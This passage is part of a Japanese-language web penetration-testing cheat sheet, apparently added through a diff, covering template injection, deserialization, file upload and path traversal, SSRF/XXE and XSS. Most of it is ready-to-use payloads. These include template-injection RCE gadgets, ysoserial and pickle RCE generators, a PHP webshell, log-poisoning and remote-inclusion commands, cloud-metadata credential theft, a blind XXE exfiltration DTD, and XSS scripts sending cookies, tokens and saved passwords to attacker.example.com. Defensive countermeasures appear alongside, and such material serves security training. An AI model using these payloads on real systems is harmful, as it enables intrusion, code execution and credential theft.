+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 検出 polyglot</span>
+${{&lt;%[%'"}}%\.
+
+<span class="c"># エンジン判定 (数式評価)</span>
+{{7*7}}       <span class="c"># Jinja2/Twig → 49</span>
+${7*7}        <span class="c"># Freemarker/Spring → 49</span>
+&lt;%= 7*7 %&gt;     <span class="c"># ERB → 49</span>
+#{7*7}        <span class="c"># Pug/Ruby/Thymeleaf → 49</span></code></pre></div>
+
+      <div class="note"><span class="lbl">エンジン / 言語の判別</span>
+        数式が評価されたら、次に文字列演算で背後の言語を切り分ける。
+        <ul>
+          <li><code>{{7*'7'}}</code> → <b>49</b> なら PHP (Twig)、<b>7777777</b> なら Python (Jinja) — 弱い型付けか文字列反復かで判別</li>
+          <li><code>${7*'7'}</code> → エラーなら Java (Freemarker、自動型変換なし)</li>
+          <li><code>#{7*7}</code> が HTML タグに包まれて <code>&lt;49&gt;</code> になる → Pug (JS、行頭がタグ)</li>
+          <li>Twig 固有の whitespace control <code>-{%  %}-</code> が効くか</li>
+        </ul>
+      </div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">python</span><button class="copy">copy</button></div><pre><code><span class="c"># Jinja2 (Python) — RCE</span>
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+<span class="c"># Freemarker (Java) — Execute クラスを ?new() で実体化</span>
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">php</span><button class="copy">copy</button></div><pre><code><span class="c"># Twig (PHP) — filter が文字列の PHP 関数名を callback として受ける</span>
+{{ [0]|reduce('system','id') }}       <span class="c"># array_reduce([0],'system','id')</span>
+{{ ['id']|map('system') }}            <span class="c"># array_map('system',['id'])</span>
+{{ ['id']|filter('system') }}         <span class="c"># array_filter(['id'],'system')</span>
+<span class="c"># 高リスク filter: reduce / map / filter / sort / column</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c"># Pug (Node.js) — sandbox に require が無くても process 経由で取得</span>
+- var require = global.process.mainModule.require
+= require('child_process').spawnSync('id').stdout
+
+<span class="c"># Handlebars — #with helper 経由で関数コンストラクタに到達し RCE</span>
+<span class="c"># (Mustache は純粋な logic-less で gadget 無し = RCE 不可)</span>
+{{#with "s" as |str|}}{{#with str.split as |c|}}...(constructor 経由で require)...{{/with}}{{/with}}
+<span class="c"># {{7*7}} が評価されない (logic-less) 点で SSTI エンジンから両者を切り分け</span>
+
+<span class="c"># tplmap — 自動化</span>
+<span class="c"># tplmap -u "https://target.example.com/page?name=test"</span></code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        Injection 系は Repeater で手動 payload を試し、Intruder で payload リストを総当たりが基本。SQLi は Burp で脆弱リクエストを保存 (右クリック → Save item) し、<code>sqlmap -r</code> に渡す連携が効率的。<b>ActiveScan++</b> 拡張で out-of-band 検出を強化、Collaborator で blind / OOB (SQLi time-based, command injection DNS) を確認。<b>Hackvertor</b> でエンコーディングチェーンを組み、WAF 回避 payload を動的生成。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>SQLi: パラメータ化クエリ (prepared statement) を全 DB アクセスで強制、ORM の raw query を排除</li>
+          <li>NoSQLi: 入力を文字列型に強制キャスト、operator ($ne / $regex 等) を含む JSON を拒否</li>
+          <li>Command injection: OS コマンド呼出を避け、言語ネイティブ API を使用、避けられない場合は引数を allowlist 化</li>
+          <li>SSTI: ユーザ入力をテンプレートに連結しない、logic-less テンプレート (Mustache) を使用、サンドボックス化</li>
+          <li>全般: WAF + 入力バリデーション (allowlist) + 最小権限 DB アカウント</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>SQLi は手動で DB 種別を特定してから sqlmap で自動化、tamper で WAF 回避</li>
+          <li>DBMS ごとに列挙構文が異なる (MSSQL sys.databases / Oracle all_tables+DUAL / PostgreSQL pg_database)</li>
+          <li>ファイル R/W は権限依存: MySQL LOAD_FILE/OUTFILE+secure_file_priv、PostgreSQL COPY/pg_read_file、MSSQL xp_cmdshell で RCE</li>
+          <li>関数で包まれた入力は文字列と関数の閉じ括弧の両方を補って脱出する</li>
+          <li>NoSQLi は operator injection ($ne / $regex) が中核、認証バイパスとブラインド抽出の両用途</li>
+          <li>Command injection は blind (時間 / DNS OOB) の検出手段を持つことが重要</li>
+          <li>cmdi のフィルタ回避は $() 分断 / base64・openssl / bash -c ラップ、shell 取得は注入先の言語に合わせる</li>
+          <li>SSTI は {{7*7}} でエンジン判定 → {{7*'7'}} で言語判別 (PHP=49 / Python=7777777) → エンジン固有 gadget</li>
+          <li>SSTI の RCE 経路: Jinja=__mro__ / Twig=filter callback / Freemarker=?new() / Pug=process.mainModule.require</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s5" class="reveal">
+      <h2><span class="num">05</span>Deserialization<span class="jp">デシリアライズ</span></h2>
+      <p>信頼できないデータのデシリアライズにより、オブジェクト生成過程で任意コード実行に至る脆弱性。言語ごとに gadget chain の選定が攻撃成否を分ける。</p>
+
+      <h3>Java</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># シリアライズデータの識別 (マジックバイト)</span>
+<span class="c"># base64: rO0AB...  /  hex: ac ed 00 05</span>
+
+<span class="c"># ysoserial — gadget chain 生成</span>
+java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0
+java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.example.com' | base64 -w0
+java -jar ysoserial.jar CommonsBeanutils1 'curl attacker.example.com/x' | base64 -w0
+
+<span class="c"># gadget 探索 (どの chain が通るか未知の場合)</span>
+<span class="c"># URLDNS で疎通確認 (RCE gadget がなくても DNS で検出可能)</span>
+java -jar ysoserial.jar URLDNS "http://attacker.example.com" | base64 -w0</code></pre></div>
+
+      <div class="note"><span class="lbl">Java gadget chain 選定基準</span>
+        <ul>
+          <li><b>URLDNS</b> — RCE 不可でも疎通確認可能、まず脆弱性の存在を DNS で立証</li>
+          <li><b>CommonsCollections1-7</b> — Apache Commons Collections バージョン依存 (3.1 / 4.0)、最頻用</li>
+          <li><b>CommonsBeanutils1</b> — commons-beanutils があれば成立、CC が塞がれた際の代替</li>
+          <li><b>Spring1-2</b> — Spring framework 環境</li>
+          <li>classpath の JAR を確認できれば gadget を絞り込める、不明なら URLDNS → CC1 → CC5 → CB1 の順で試行</li>
+        </ul>
+      </div>
+
+      <h3>PHP</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">php</span><button class="copy">copy</button></div><pre><code><span class="c">// 手動 object injection (マジックメソッド __wakeup / __destruct 悪用)</span>
+O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
+
+<span class="c">// phpggc — gadget chain 生成</span>
+<span class="c">// phpggc Laravel/RCE1 system id</span>
+<span class="c">// phpggc Monolog/RCE1 system id -p phar</span>
+<span class="c">// phpggc Symfony/RCE4 system id</span></code></pre></div>
+
+      <h3>.NET</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ysoserial.net — gadget chain 生成</span>
+<span class="c"># ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"</span>
+<span class="c"># ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"</span>
+
+<span class="c"># ViewState (ASP.NET) — MAC 無効 or 鍵漏洩時</span>
+<span class="c"># ysoserial.exe -p ViewState -g TextFormattingRunProperties \</span>
+<span class="c">#   --generator=&lt;GENERATOR&gt; --validationkey=&lt;KEY&gt; --validationalg=SHA1 -c "cmd"</span></code></pre></div>
+
+      <h3>Python</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">python</span><button class="copy">copy</button></div><pre><code><span class="c"># pickle — __reduce__ による RCE</span>
+import pickle, base64, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+
+<span class="c"># PyYAML (yaml.load、SafeLoader 未使用時)</span>
+<span class="c"># !!python/object/apply:os.system ["id"]</span></code></pre></div>
+
+      <h3>Node.js</h3>
+      <p>node-serialize 等の <code>unserialize()</code> に信頼できない入力が渡ると RCE に至る。Cookie 等に JSON-base64 で渡された値がデシリアライズ時に IIFE (即時実行関数) として評価される点を悪用する。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c">// node-serialize の RCE 構造 (_$$ND_FUNC$$_ + IIFE)</span>
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
+
+<span class="c">// 上記 JSON を base64 化して Cookie / パラメータに投入</span>
+<span class="c">// Burp / http proxy で該当値を差し替えて送信</span></code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        シリアライズデータの識別に <b>Java Deserialization Scanner</b> 拡張が有効。DNS/OOB での blind 検出 (Collaborator 連携) と ysoserial 呼出を統合できる。ViewState は <b>Burp の passive scan</b> が MAC 無効を検出、<b>Hackvertor</b> で base64 デコードしてペイロードを可視化。生成した gadget を Repeater で送信し、Collaborator で疎通確認する流れ。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>信頼できないデータをデシリアライズしない — JSON 等のデータのみのフォーマットを使用</li>
+          <li>避けられない場合は署名 / MAC で完全性を保証 (ASP.NET ViewState の MAC 有効化)</li>
+          <li>Java: ObjectInputFilter (JEP 290) で許可クラスを allowlist 化、脆弱 gadget ライブラリを排除</li>
+          <li>PHP: unserialize に allowed_classes オプションを指定、__wakeup / __destruct を監査</li>
+          <li>Python: pickle を避け、yaml は safe_load を使用</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Java は URLDNS で疎通確認 → classpath 依存の gadget chain (CC1/CC5/CB1) を試行</li>
+          <li>PHP は phpggc、.NET は ysoserial.net、Python は pickle __reduce__ が各言語の標準手法</li>
+          <li>Node.js は node-serialize の unserialize() が IIFE を評価する構造を突く、Cookie 経由が典型</li>
+          <li>ViewState は MAC 無効 or 鍵漏洩が前提、machineKey 漏洩は致命的</li>
+          <li>gadget が不明でも URLDNS / DNS OOB で「脆弱性の存在」を先に立証できる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s6" class="reveal">
+      <h2><span class="num">06</span>File &amp; Path<span class="jp">ファイル・パス</span></h2>
+      <p>ファイルアップロード検証不備とパストラバーサル。任意ファイル書込は RCE に、任意ファイル読込は機密情報漏洩に直結する。</p>
+
+      <h3>File Upload バイパス</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 拡張子フィルタ回避</span>
+shell.php.jpg          <span class="c"># 二重拡張子</span>
+shell.pHp              <span class="c"># 大小文字</span>
+shell.php5 / .phtml    <span class="c"># 代替拡張子</span>
+shell.php%00.jpg       <span class="c"># null byte (旧 PHP)</span>
+shell.php:.jpg         <span class="c"># NTFS ADS</span>
+
+<span class="c"># Content-Type / マジックバイト偽装</span>
+<span class="c"># GIF89a; を先頭に付与して image/gif に偽装</span>
+
+<span class="c"># .htaccess アップロードで拡張子ハンドラ追加</span>
+<span class="c"># AddType application/x-httpd-php .jpg</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">php</span><button class="copy">copy</button></div><pre><code><span class="c">// 最小 PHP webshell (画像偽装と併用)</span>
+GIF89a;
+&lt;?php system($_GET['c']); ?&gt;
+
+<span class="c">// polyglot: 有効な画像かつ PHP として実行可能</span></code></pre></div>
+
+      <h3>Path Traversal / LFI / RFI</h3>
+      <div class="note"><span class="lbl">示唆的パラメータ (suggestive parameter)</span>
+        パラメータ名から後端処理を推測し、traversal / LFI の当たりを付ける。<code>?file=</code> / <code>?path=</code> / <code>?download=</code> / <code>?f=</code> はファイル処理の可能性が高く traversal 候補、<code>?page=</code> / <code>?include=</code> / <code>?template=</code> は include 処理で LFI 候補、<code>?search=</code> / <code>?q=</code> は SQLi / 検索、<code>?url=</code> / <code>?fetch=</code> は SSRF。値を <code>/etc/passwd</code> や <code>../</code> に差し替えて挙動を確認する。
+      </div>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 基本トラバーサル</span>
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+
+<span class="c"># フィルタ回避</span>
+....//....//etc/passwd          <span class="c"># 除去型フィルタ回避</span>
+%2e%2e%2f%2e%2e%2f              <span class="c"># URL エンコード</span>
+..%252f..%252f                 <span class="c"># 二重エンコード</span>
+/etc/passwd%00                 <span class="c"># null byte 切詰</span>
+
+<span class="c"># PHP wrapper (LFI → ソース漏洩 / RCE)</span>
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=config.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
+expect://id</code></pre></div>
+
+      <h3>LFI → RCE 発展経路</h3>
+      <p>読み取り専用に見える LFI も、攻撃者制御下のコンテンツをサーバ側ファイルに書き込んでから include させれば RCE に発展する。ログ / セッション / アップロードファイルが典型的な「注入先」。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># (1) Log Poisoning — User-Agent に PHP コードを注入 → ログを include</span>
+curl -A '&lt;?php system($_GET["c"]); ?&gt;' https://target.example.com/
+<span class="c"># 続けて LFI でログを取り込み実行</span>
+https://target.example.com/page.php?file=/var/log/apache2/access.log&amp;c=id
+<span class="c"># SSH の認証ログ (/var/log/auth.log) も同様、ユーザ名に PHP コードを仕込む</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># (2) PHP Session Poisoning — セッションファイルに PHP コードを残す</span>
+<span class="c"># username 等の反映される入力に PHP コードを入れてログイン試行</span>
+<span class="c"># セッションファイルの典型パス:</span>
+<span class="c">#   /var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</span>
+<span class="c">#   /tmp/sess_&lt;PHPSESSID&gt;  /var/lib/php5/</span>
+https://target.example.com/page.php?file=/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;&amp;c=id</code></pre></div>
+
+      <div class="note"><span class="lbl">Note</span>
+        セッション / ログの正確なパスは <code>phpinfo</code> (<code>session.save_path</code> / ログ設定) が読めれば確定できる。<code>phpinfo.php</code> の露出、または LFI で <code>php://filter</code> 経由に設定ファイルを読むことで特定する。アップロード機能があれば、画像偽装した PHP を上げてそのパスを include する経路が最短。
+      </div>
+
+      <h3>RFI (Remote File Inclusion)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># allow_url_include=On の場合、攻撃者サーバのコードを直接 include</span>
+https://target.example.com/page.php?file=http://attacker.example.com/shell.txt
+<span class="c"># shell.txt に &lt;?php system($_GET["c"]); ?&gt; を配置</span></code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        アップロードは Repeater で Content-Type / ファイル名 / マジックバイトを個別に改変して検証。Intruder でファイル名の拡張子リスト (<code>seclists/Web-Shells</code> や拡張子 payload) を総当たり。Path traversal は <b>Intruder</b> で traversal payload リストを流し、レスポンス長 / <code>root:</code> 文字列でヒット判定。<b>Hackvertor</b> で多重エンコーディングを動的生成。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>アップロードファイルの拡張子を allowlist で検証、MIME とマジックバイトの両方をチェック</li>
+          <li>アップロード先を web root 外に配置、実行権限を剥奪、ランダムファイル名にリネーム</li>
+          <li>パス操作でユーザ入力を使わない、canonicalize 後に basedir 制約を検証</li>
+          <li>PHP: allow_url_include / allow_url_fopen を無効化、危険な wrapper を制限</li>
+          <li>WAF で traversal シーケンス (../ / エンコード変種) を検出・遮断</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>アップロードは拡張子 / Content-Type / マジックバイト / .htaccess の複合バイパスを試す</li>
+          <li>LFI は php:// filter wrapper でソース漏洩、data:// / expect:// で RCE に発展</li>
+          <li>LFI → RCE は Log Poisoning (User-Agent/ログ) と PHP Session Poisoning (session ファイル) が定番、パス特定は phpinfo が近道</li>
+          <li>RFI は allow_url_include=On が前提、攻撃者サーバのコードを直接取り込む</li>
+          <li>traversal フィルタは多重エンコード / 除去型回避 (....//) で突破</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s7" class="reveal">
+      <h2><span class="num">07</span>SSRF &amp; XXE<span class="jp">SSRF・XXE</span></h2>
+      <p>サーバにリクエストを強制する SSRF と、XML パーサの外部エンティティ処理を悪用する XXE。いずれも内部ネットワーク / クラウドメタデータへの到達が主目的。</p>
+
+      <h3>SSRF (Server-Side Request Forgery)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># クラウドメタデータ (認証情報奪取)</span>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/    <span class="c"># AWS</span>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;
+http://metadata.google.internal/computeMetadata/v1/    <span class="c"># GCP (要 Metadata-Flavor: Google)</span>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01    <span class="c"># Azure</span>
+
+<span class="c"># 内部ポートスキャン / サービス到達</span>
+http://127.0.0.1:6379/    <span class="c"># Redis</span>
+http://127.0.0.1:8080/admin
+
+<span class="c"># フィルタ回避 (127.0.0.1 ブロック時)</span>
+http://127.1/
+http://0177.0.0.1/          <span class="c"># 8 進</span>
+http://2130706433/          <span class="c"># 10 進</span>
+http://localhost.attacker.example.com/    <span class="c"># DNS rebinding</span>
+http://[::1]/               <span class="c"># IPv6</span></code></pre></div>
+
+      <div class="note"><span class="lbl">クラウドメタデータの差異</span>
+        <ul>
+          <li><b>AWS</b> — IMDSv1 は <code>GET /latest/meta-data/iam/security-credentials/&lt;ROLE&gt;</code> で AccessKeyId/SecretAccessKey/SessionToken を奪取。IMDSv2 は <code>PUT /latest/api/token</code> (ヘッダ <code>X-aws-ec2-metadata-token-ttl-seconds</code>) でトークン取得が先行必要</li>
+          <li><b>GCP</b> — <code>metadata.google.internal/computeMetadata/v1/</code>、ヘッダ <code>Metadata-Flavor: Google</code> 必須</li>
+          <li><b>Azure</b> — <code>169.254.169.254/metadata/instance?api-version=...</code></li>
+          <li>169.254.0.0/16 は Link-Local、外部ルーティングされず同一 NIC からのみ到達可能</li>
+        </ul>
+      </div>
+
+      <div class="note"><span class="lbl">scheme 判別で後端 client を推測</span>
+        SSRF は http/https 以外の scheme で後端 HTTP client の種類を切り分ける。<code>file:///etc/passwd</code> が通れば curl / PHP (LFI に発展)、通らなければ Python requests (http/https のみ)。<code>gopher://</code> が使えれば任意 TCP に拡張でき、改行注入で完全な HTTP リクエスト (POST 含む) や Redis / MySQL へのコマンド送信を偽造できる。gopher は selector で先頭 1 文字が切られる点と、ブラウザ→web app→SSRF の二段のため URL の二重エンコードが必要な点に注意。
+      </div>
+
+      <div class="note"><span class="lbl">microservice 認証バイパス (Session Riding 型)</span>
+        API Gateway / リバースプロキシで施す認証・JWT・ACL・IP allowlist は「外→内」の境界にのみ適用され、内部 microservice 間の通信には効かない。SSRF 可能な microservice A を踏み台にすると、内部ネットワーク身分で microservice B に直接リクエストでき、ゲートウェイの認証を回避して内部 API を叩ける。
+      </div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ffuf と組み合わせた内部ポートスキャン</span>
+<span class="c"># SSRF 可能なパラメータ / ヘッダの FUZZ 位置にポート番号を流す</span>
+ffuf -u "https://target.example.com/fetch?url=http://127.0.0.1:FUZZ" \
+  -w &lt;(seq 0 65535) -ac
+
+<span class="c"># プロキシ系ヘッダ経由の SSRF (実装依存のヘッダ名)</span>
+ffuf -u https://target.example.com -H "X-Forwarded-Host: 127.0.0.1:FUZZ" \
+  -w &lt;(seq 1 10000) -ac</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Gopher — 任意 TCP パケット (Redis / SMTP へのコマンド注入)</span>
+gopher://127.0.0.1:6379/_SET%20key%20value
+<span class="c"># Redis へ set / config set dir で webshell 書込に発展</span></code></pre></div>
+
+      <h3>XXE (XML External Entity)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">xml</span><button class="copy">copy</button></div><pre><code><span class="c">&lt;!-- ファイル読込 --&gt;</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+<span class="c">&lt;!-- SSH 秘密鍵 / Windows ファイル --&gt;</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///home/alice/.ssh/id_rsa"&gt;]&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;]&gt;
+
+<span class="c">&lt;!-- 読込結果が空になる場合は php filter で base64 化 --&gt;</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;]&gt;
+
+<span class="c">&lt;!-- コマンド実行 (expect モジュール有効時) --&gt;</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "expect://id"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+<span class="c">&lt;!-- SSRF (XXE 経由でメタデータ到達) --&gt;</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;
+
+<span class="c">&lt;!-- OOB 抽出 (blind XXE、外部 DTD) --&gt;</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://attacker.example.com/evil.dtd"&gt; %ext;]&gt;</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">xml</span><button class="copy">copy</button></div><pre><code><span class="c">&lt;!-- evil.dtd (OOB 抽出用外部 DTD) --&gt;</span>
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.example.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre></div>
+
+      <h3>XXE against JSON (Content-Type 切替)</h3>
+      <p>JSON を受け付けるエンドポイントでも、XML パーサが背後にある場合は Content-Type を <code>application/xml</code> に変え、body を XML に書き換えることで XXE が成立しうる。JSON API だからと XXE を除外しない。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">http</span><button class="copy">copy</button></div><pre><code>POST /api/endpoint HTTP/1.1
+Host: target.example.com
+Accept: application/json
+Content-Type: application/xml
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre></div>
+
+      <div class="note"><span class="lbl">Burp workflow</span>
+        SSRF / blind XXE はどちらも <b>Collaborator</b> が中核。Repeater で payload を送信し、Collaborator client で DNS / HTTP interaction を確認する。SSRF のフィルタ回避は Intruder で IP 表記変種 (8進/10進/IPv6) を総当たり。XXE は Content-Type を <code>application/xml</code> に変えつつ、JSON エンドポイントでも XML を受け付けるか Repeater で検証 (Content-Type 切替攻撃)。<b>Collaborator Everywhere</b> 拡張で全リクエストに OOB payload を自動注入。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>SSRF: 送信先を allowlist で制限、内部 IP レンジ (169.254.x / 127.x / 10.x / 172.16.x / 192.168.x) を拒否</li>
+          <li>SSRF: DNS rebinding 対策として解決後 IP を再検証、リダイレクト追従を無効化</li>
+          <li>クラウド: IMDSv2 (トークン必須) に移行、メタデータエンドポイントへのアクセスを制限</li>
+          <li>XXE: XML パーサで外部エンティティ / DTD 処理を無効化 (FEATURE_SECURE_PROCESSING)</li>
+          <li>XXE: 可能なら XML を避け JSON を使用、XML 必須なら軽量パーサ設定を統一</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>SSRF の第一目標はクラウドメタデータ (169.254.169.254) の認証情報奪取</li>
+          <li>SSRF フィルタは IP 表記変種 (127.1 / 8進 / 10進 / IPv6) と DNS rebinding で回避</li>
+          <li>クラウド別に metadata の作法が違う (AWS IMDSv2 の token / GCP の Metadata-Flavor / Azure)</li>
+          <li>scheme (file/gopher) の可否で後端 client を推測、gopher は任意 TCP・内部 API 偽造に発展</li>
+          <li>SSRF は microservice 間通信のゲートウェイ認証バイパスにも使える</li>
+          <li>Gopher wrapper は SSRF を任意 TCP に拡張、Redis 経由の RCE に発展</li>
+          <li>blind XXE は外部 DTD による OOB 抽出、Collaborator で疎通と抽出を確認</li>
+          <li>JSON エンドポイントも Content-Type を application/xml に切替えれば XXE 対象になりうる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s8" class="reveal">
+      <h2><span class="num">08</span>Client-side<span class="jp">クライアントサイド</span></h2>
+      <p>ブラウザ上で実行される攻撃。XSS が中核で、CSRF / clickjacking / CORS 設定不備が続く。被害者のセッション / 操作を攻撃者が乗っ取る。</p>
+
+      <h3>XSS (Cross-Site Scripting)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">html</span><button class="copy">copy</button></div><pre><code><span class="c">&lt;!-- 基本検出 --&gt;</span>
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;img src=x onerror=alert(document.domain)&gt;
+&lt;svg onload=alert(document.domain)&gt;
+
+<span class="c">&lt;!-- 属性コンテキスト脱出 --&gt;</span>
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+' onmouseover='alert(1)
+
+<span class="c">&lt;!-- フィルタ回避 --&gt;</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;img src=x onerror=alert`1`&gt;
+&lt;svg/onload=alert(1)&gt;
+javascript:alert(1)     <span class="c"># href / src コンテキスト</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c">// Cookie 窃取 (HttpOnly 未設定時) — img / fetch 両パターン</span>
+&lt;script&gt;new Image().src='https://attacker.example.com/?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;fetch('https://attacker.example.com/?c='+encodeURIComponent(document.cookie))&lt;/script&gt;
+
+<span class="c">// キーロガー / セッション hijack 用トークン送出</span>
+&lt;script&gt;fetch('https://attacker.example.com/?t='+localStorage.getItem('token'))&lt;/script&gt;</code></pre></div>
+
+      <div class="note"><span class="lbl">XSS 類型と検証</span>
+        <ul>
+          <li><b>Reflected</b> — 入力が同一レスポンスに即反映。URL パラメータ / 検索フォームが典型エントリポイント</li>
+          <li><b>Stored</b> — 入力が保存され他ユーザに配信。コメント / プロフィール / ログ表示画面</li>
+          <li><b>DOM-based</b> — サーバを経由せず JS が source→sink で処理。<code>location.hash</code> → <code>innerHTML</code> 等</li>
+          <li><b>Blind</b> — 攻撃者が結果を直接見られない (管理画面 / サポート問合せ)。OOB コールバック (Collaborator / 自前サーバ) で発火を検知</li>
+        </ul>
+      </div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c">// DOM XSS の source → sink</span>
+<span class="c">// source: location / location.hash / document.URL / document.referrer / postMessage</span>
+<span class="c">// sink:   innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / setTimeout</span>
+
+<span class="c">// Blind XSS — 遅延実行環境で外部スクリプトを読み込む</span>
+&lt;script src=https://attacker.example.com/x.js&gt;&lt;/script&gt;
+"&gt;&lt;script src=https://attacker.example.com/x.js&gt;&lt;/script&gt;</code></pre></div>
+
+      <p><b>XSS Exploitation の発展</b> — XSS の価値は alert ではなく被害者ブラウザの権限で行動すること。長い payload は文字数制限を避けるため外部スクリプト読込に逃がすのが定石。以下は代表的な exploitation。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">javascript</span><button class="copy">copy</button></div><pre><code><span class="c">// 外部スクリプトに逃がす (img/onerror から動的 script 挿入)</span>
+&lt;img src=x onerror="var s=document.createElement('script');s.src='https://attacker.example.com/x.js';document.body.appendChild(s)"&gt;
+
+<span class="c">// Saved Password 窃取 — 偽の input を DOM 挿入し browser autofill を誘発</span>
+var u=document.createElement('input'); u.type='text'; u.style.position='fixed';
+var p=document.createElement('input'); p.type='password'; p.style.position='fixed';
+document.body.append(u); document.body.append(p);
+setTimeout(function(){ fetch('https://attacker.example.com/?u='+u.value+'&amp;p='+p.value) },5000);
+
+<span class="c">// Phishing — ページ全体を書き換え、form action を攻撃者サーバへ</span>
+fetch('/login').then(r=&gt;r.text()).then(d=&gt;{
+  document.documentElement.innerHTML=d;
+  var f=document.getElementsByTagName('form')[0];
